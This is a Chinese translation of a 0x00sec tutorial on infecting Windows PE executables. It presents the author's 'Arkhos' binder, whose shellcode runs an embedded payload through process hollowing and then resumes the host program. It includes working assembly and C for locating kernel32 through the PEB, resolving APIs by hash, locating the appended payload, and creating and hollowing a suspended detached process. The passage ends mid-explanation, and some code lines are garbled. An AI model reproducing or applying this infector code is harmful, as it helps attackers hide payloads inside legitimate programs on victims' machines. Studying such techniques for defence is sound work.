# 【技术分享】PE文件感染技术（Part II）
|
##### 译文声明
本文是翻译文章，文章来源：0x00sec.org
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**一、简介**
一年多以前，我发表了[一篇文章](https://0x00sec.org/t/pe-file-infection/401)，介绍了如何使用shellcode来感染可执行文件。从那时起，我又学到了许多新的知识和新的技术，因此最近一段时间，我还想开发另一个PoC，再次完成这个任务。新的PoC与之前的方法途径相同，但融合了我所学的新知识及新技术，更加高级。在本文中，我会介绍一种文件“绑定（binding）”技术。之所以用到“绑定”这个词，原因与这个概念的最初构想有关，因为这个技术使用了与上一篇文章类似的感染机理。我创建了一个项目：[Arkhos](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos)，这个项目的功能是使用一段shellcode（[AIDS](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos/tree/master/AIDS)）来实现PoC效果。顺便提一下，AIDS指的是“Assimilative
Infection using Diabolical Shellcode”。
如果想理解并掌握该技术，所需的技能及知识点为：
**C/C++编程技术**
**WinAPI**
**Intel x86汇编技术**
**PE文件格式**
**RunPE/进程Hollow技术（Process Hollowing）**
下文中涉及的相关技术源于我个人对Windows内部机制的研究及理解，如果读者发现其中有何纰漏，请联系我，我会尽快改正。欢迎读者给出任何建设性意见或者建议。
**二、整体过程**
我们的目的是将一个可执行文件A合并到另一个可执行文件B中，具体方法是将一段引导型shellcode（bootstrap
shellcode）与可执行载荷结合起来，感染可执行文件B。感染成功后，新的入口点会指向我们设定的引导代码，引导代码首先会使用进程Hollow技术以新进程方式运行载荷，然后跳转到原始入口点，执行原始程序。
成功感染可执行文件后，其文件结构如下所示：
理想情况下，引导型shellcode可以填充到.text节（section）的代码洞（code
cave）中，然而，实际情况中，shellcode的大小可能较大，此时我们可以将其作为一个新的节附加到PE文件中。
**三、Shellcode**
**3.1 开发要点**
在开发shellcode之前，有些要点需要引起我们的注意。最重要的一点就是实现代码的位置无关特性。如果shellcode需要依赖硬编码的位置，那么对于另一个可执行文件来说，相关环境会发生变化，导致shellcode无法成功运行。因此，我们不能依赖一个导入表来调用WinAPI函数，需要这些函数时，我们必须解决字符串问题。
**3.2 动态获取WinAPI函数**
根据Windows对可执行文件的处理方式，我们在内存中总能看到两个DLL文件的身影： **kernel32.dll** 以及 **ntdll.dll**
。我们可以充分利用这个基础，获取由 **WinAPI**
提供的任何函数地址。在本文中，我们只需要使用这两个DLL文件导出的函数，因为这些函数足以满足我们的需求。
那么，我们如何才能做到这一点？最常见的方法是找到正在运行的程序的PEB结构，该结构的位置为 **fs:30h**
，然后我们就可以查找并遍历进程中的模块。比如，我们可以查找kernel32.dll和ntdll.dll的基地址。从这些基地址出发，我们可以像查找其他PE文件那样，解析模块的文件，遍历导出函数表，直到找到匹配结果。如果你想了解更详细的过程，你可以参考我写的[另一篇文章](https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043)。实践是检验真理的唯一标准，上述过程的代码实现如下所示：
    ; get kernel32 base address
    _get_kernel32:
    moveax, [fs:0x30]
    moveax, [eax + 0x0C]
    moveax, [eax + 0x14]
    moveax, [eax]
    moveax, [eax]
    moveax, [eax + 0x10]
    ret
    FARPROC GetKernel32Function(LPCSTR szFuncName) {
    HMODULE hKernel32Mod = get_kernel32();
    // get DOS header
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
    // get NT headers
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh->e_lfanew);
    // find eat
    PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // find export table functions
    LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfFunctions);
    LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfNames);
    LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied->AddressOfNameOrdinals);
    // loop through all names of functions
    for (int i = 0; i NumberOfNames; i++) {
    LPSTR lpName = (LPSTR)((DWORD)hKernel32Mod + dwNames[i]);
    if (!strcmp(szFuncName, lpName))
    return (FARPROC)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
    }
    return NULL;
    }
**3.3 动态计算字符串地址**
我们需要解决的另一个问题是字符串地址问题。字符串使用的是硬编码的地址，为了在运行时（run-time）找到这些地址，一种方法是使用delta
offset技巧来动态计算字符串的地址，相关计算代码如下所示：
    string:  db "Hello world!", 0
    _get_loc:
        call _loc
    _loc:
        pop edx
        ret
    _get_string:
        call _get_loc              ; get address of _loc
        sub edx, _loc - string     ; calculate address of string by subtracting
                                   ; the difference in bytes from _loc
        mov eax, edx               ; return the address of the string
        ret
**3.4 其他依赖源**
其他地方可能会碰到一些依赖问题，比如对某些基础函数（如strlen）的依赖问题，因此我们也需要手动编写这些函数代码。为了避免在编译可执行文件过程中出现任何依赖问题，我选择使用C以及汇编语言，通过gcc以及nasm编译得到目标代码，然后使用ld手动完成链接过程。需要注意的是，函数调用有
**相对** 以及 **绝对** 两种形式。想使用相对形式（位置无关代码），它们必须使用E8十六进制操作码。
**四、编写Shellcode**
首先我想先谈谈shellcode代码，因为shellcode是binder程序中必需的一个组件。shellcode需要实现两个目标：以新进程方式运行载荷，然后继续执行原始程序。
具体步骤为：
1、在最后一个section中找到载荷。
2、创建一个挂起的（suspended）进程。
3、掏空进程，为载荷预留空间，空间大小对应从载荷映像（image）基址到映像结束所需的空间大小。
4、为载荷分配内存空间，解析载荷并将载荷写入正确的地址。
5、恢复挂起进程的执行，开始执行载荷。
6、跳转到原始程序的原始入口点。
**4.1 定位payload**
首先需要找到可执行文件最后一个section所对应的相关字节，具体方法为：
    LPVOID GetPayload(LPVOID lpModule) {
    // get DOS header
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpModule;
    // get NT headers
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)lpModule + pidh->e_lfanew);
    // find .text section
    PIMAGE_SECTION_HEADER pishText = IMAGE_FIRST_SECTION(pinh);
    // get last IMAGE_SECTION_HEADER
    PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
    return (LPVOID)(pinh->OptionalHeader.ImageBase + pishLast->VirtualAddress);
    }
**GetPayload**
函数的任务非常简单。该函数可以得到一个指针，该指针指向可执行模块在内存中的基址，然后解析PE头部结构，从中我们可以得到一些必要的信息来定位我们寻找的那些节。我们可以使用IMAGE_FIRST_SECTION宏，计算由NT头部提供的偏移信息来找到第一个section。
**IMAGE_FIRST_SECTION** 宏的代码如下所示：
    #define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        
        ((ULONG_PTR)(ntheader) +                                            
         FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 
         ((ntheader))->FileHeader.SizeOfOptionalHeader   
        ))
与数组访问过程类似，利用第一个section的头部地址，我们可以根据section的数量计算偏移量，找到最后一个section的头部。一旦找到最后一个section的头部后，我们可以通过
**VirtualAddress**
字段找到相对虚拟地址（请记住我们面对的是内存中的可执行文件，而不是原始的文件），该地址与ImageBase相加后就能得到绝对虚拟地址。
**4.2 RunPE/进程Hollow技术（Process Hollowing）**
接下来我们需要模拟Windows映像加载器，将载荷加载到新进程的虚拟内存中。首先，我们需要一个进程，该进程是载荷的写入对象，我们可以使用
**CreateProcess** 来创建这个进程，在创建进程时指定CREATE_SUSPENDED标志，这样我们就能把进程的可执行模块换成我们自己的载荷。
    // process info
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    MyMemset(&pi, 0, sizeof(pi));
    MyMemset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    // first create process as suspended
    pfnCreateProcessA fnCreateProcessA = (pfnCreateProcessA)GetKernel32Function(0xA851D916);
    fnCreateProcessA(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS, NULL,NULL, &si, &pi);
我们需要使用原始程序的文件来创建新进程。新创建进程的当前状态如下所示（假设原始程序以及载荷使用同样的基址）：
需要注意的是，这里我们可能需要使用 **DETACHED_PROCESS**
标志，这样创建出的进程不是一个子进程，也就是说，如果原始程序所对应的进程结束运行，我们创建的进程也不会被终止。我们可以将wShowWindow字段的值设为SW_HIDE，但这里我会把它设置为SW_SHOW，以便显示载荷进程成功执行的结果。
为了能将载荷写入进程中，我们需要将正在使用的已分配的所有内存unmap掉，只要将基地址作为参数传递给 **ZwUnmapViewOfSection**
函数即可。
    // unmap memory space for our process
    pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
    pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
    pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddressfnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
    fnZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
新进程被掏空后的示意图如下：
现在，我们可以解析载荷的PE文件，将其写入进程的内存空间中。首先，在ImageBase地址处分配大小为SizeOfImage的一段空间，然后使用